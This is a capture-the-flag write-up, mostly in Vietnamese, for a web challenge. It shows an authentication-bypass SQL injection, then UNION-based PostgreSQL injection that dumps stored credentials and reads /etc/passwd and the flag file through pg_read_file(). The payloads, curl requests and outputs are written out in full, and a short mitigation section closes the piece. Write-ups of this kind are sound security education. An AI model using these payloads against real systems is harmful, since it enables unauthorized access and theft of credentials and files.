# 🔓 Write-up: Double SQL Injection to PostgreSQL File Read

> **Challenge URL:** `http://61.14.233.78:1338/login`  
> **Category:** Web Exploitation  
> **Flag:** `VSL{d0ubl3_sqli_t0_p0stgr3s_rc3_8d2f19}`

---

## 📋 Tổng quan

Bài này là một chuỗi tấn công gồm **2 lớp SQL Injection**:

1. **SQLi #1** – Bypass authentication tại trang login
2. **SQLi #2** – UNION-based injection tại admin panel → đọc file trên server qua PostgreSQL `pg_read_file()`

---

## 🔍 Bước 1: Trinh sát (Reconnaissance)

Truy cập `http://61.14.233.78:1338/login`, ta thấy một trang login với giao diện "SECURE_GATE - CENTRAL ACCESS SYSTEM".

Quan sát source HTML:

```html
<form action="/login" method="POST" class="login-form">
    <input type="text" id="username" name="username" placeholder="e.g. admin" required>
    <input type="password" id="password" name="password" placeholder="••••••••" required>
    <button type="submit">AUTHENTICATE SYSTEM</button>
</form>
```

Từ response header, ta xác định được tech stack:

```
Server: Werkzeug/3.1.8 Python/3.10.20
```

→ **Flask framework** chạy trên Python, khả năng cao sử dụng SQL database phía sau.

---

## 💉 Bước 2: SQL Injection #1 – Bypass Login

Thử đăng nhập với `admin / admin` → nhận lỗi `"Invalid credentials."`.

Thử payload SQL Injection kinh điển:

```
Username: admin' OR '1'='1
Password: admin' OR '1'='1
```

**Request:**

```bash
curl -X POST "http://61.14.233.78:1338/login" \
  -d "username=admin' OR '1'='1&password=admin' OR '1'='1" -i
```

**Response:**

```http
HTTP/1.1 302 FOUND
Location: /admin
Set-Cookie: session=eyJpc19hZG1pbiI6dHJ1ZSwidXNlcl9pZCI6MSwidXNlcm5hbWUiOiJhZG1pbiJ9...
```

✅ **Bypass thành công!** Server redirect tới `/admin` và set session cookie với quyền admin.

Decode JWT session (base64):
```json
{"is_admin": true, "user_id": 1, "username": "admin"}
```

---

## 🖥️ Bước 3: Phân tích trang Admin

Truy cập `/admin` với cookie session, ta thấy giao diện **"ROOT ADMINISTRATOR CONSOLE"** với chức năng **System Log Diagnostics**.

Điểm quan trọng nhất — trang hiển thị thẳng raw query:

```sql
SELECT id, log_date, message FROM system_logs WHERE message LIKE '%{input}%'
```

→ Input từ user được nhúng **trực tiếp** vào câu SQL query mà **không có sanitization**.  
→ Database: **PostgreSQL** (ghi rõ "POSTGRES DATABASE ENGINE").

---

## 💉 Bước 4: SQL Injection #2 – UNION-based SQLi

### 4.1. Xác định số cột và kiểu dữ liệu

Từ query gốc, ta biết có **3 cột**: `id` (integer), `log_date` (timestamp), `message` (text).

Thử UNION với kiểu dữ liệu sai:

```
' UNION SELECT 1, CAST(table_name AS TEXT), CAST(table_schema AS TEXT) FROM information_schema.tables WHERE table_schema='public' --
```

→ Lỗi: `UNION types timestamp without time zone and text cannot be matched`

Sửa lại cột thứ 2 thành `NOW()` (timestamp):

```
' UNION SELECT 1, NOW(), table_name FROM information_schema.tables WHERE table_schema='public' --
```

✅ Thành công!

### 4.2. Liệt kê các bảng

**Payload:**

```
' UNION SELECT 1, NOW(), table_name FROM information_schema.tables WHERE table_schema='public' --
```

**Kết quả:**

| Bảng |
|------|
| `users` |
| `system_logs` |

### 4.3. Liệt kê cột trong bảng `users`

**Payload:**

```
' UNION SELECT 1, NOW(), column_name FROM information_schema.columns WHERE table_name='users' --
```

**Kết quả:**

| Cột |
|-----|
| `id` |
| `username` |
| `password` |
| `is_admin` |

### 4.4. Dump dữ liệu bảng `users`

**Payload:**

```
' UNION SELECT id, NOW(), username||':::'||password FROM users --
```

**Kết quả:**

| Username | Password |
|----------|----------|
| `admin` | `super_secure_password_982341234` |
| `guest` | `guest` |

> Tuy đã có credentials nhưng flag chưa nằm trong database.

---

## 📂 Bước 5: Đọc file trên server – PostgreSQL `pg_read_file()`

Vì server chạy PostgreSQL với quyền **SUPERUSER**, ta có thể sử dụng hàm `pg_read_file()` để đọc file tùy ý trên hệ thống.

### 5.1. Xác nhận khả năng đọc file

**Payload:**

```
' UNION SELECT 1, NOW(), pg_read_file('/etc/passwd') --
```

**Kết quả:**

```
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
...
postgres:x:70:70::/var/lib/postgresql:/bin/sh
```

✅ Đọc file thành công! Server chạy Alpine Linux (Docker container).

### 5.2. Đọc flag

**Payload:**

```
' UNION SELECT 1, NOW(), pg_read_file('/flag.txt') --
```

**Kết quả:**

```
VSL{d0ubl3_sqli_t0_p0stgr3s_rc3_8d2f19}
```

🎉 **GG!**

---

## 🏁 Flag

```
VSL{d0ubl3_sqli_t0_p0stgr3s_rc3_8d2f19}
```

---

## 🧠 Kiến thức rút ra

### Attack Chain

```
Login SQLi (Auth Bypass)
        │
        ▼
  Admin Panel Access
        │
        ▼
UNION-based SQLi (PostgreSQL)
        │
        ▼
  pg_read_file('/flag.txt')
        │
        ▼
      FLAG!
```

### Lỗ hổng

| # | Lỗ hổng | Vị trí | Mức độ |
|---|---------|--------|--------|
| 1 | SQL Injection (Auth Bypass) | `/login` – fields `username`, `password` | Critical |
| 2 | SQL Injection (UNION-based) | `/admin` – field `search` | Critical |
| 3 | PostgreSQL chạy quyền Superuser | Database configuration | High |
| 4 | Arbitrary File Read | `pg_read_file()` với quyền superuser | Critical |

### Cách phòng chống

1. **Sử dụng Parameterized Queries / Prepared Statements** – Không bao giờ nối chuỗi trực tiếp vào SQL
2. **Principle of Least Privilege** – Không chạy PostgreSQL với quyền superuser
3. **Input Validation** – Validate và sanitize tất cả input từ user
4. **WAF (Web Application Firewall)** – Chặn các pattern SQLi phổ biến
5. **Error Handling** – Không hiển thị raw SQL error cho user

---

*Written on 2026-07-04*
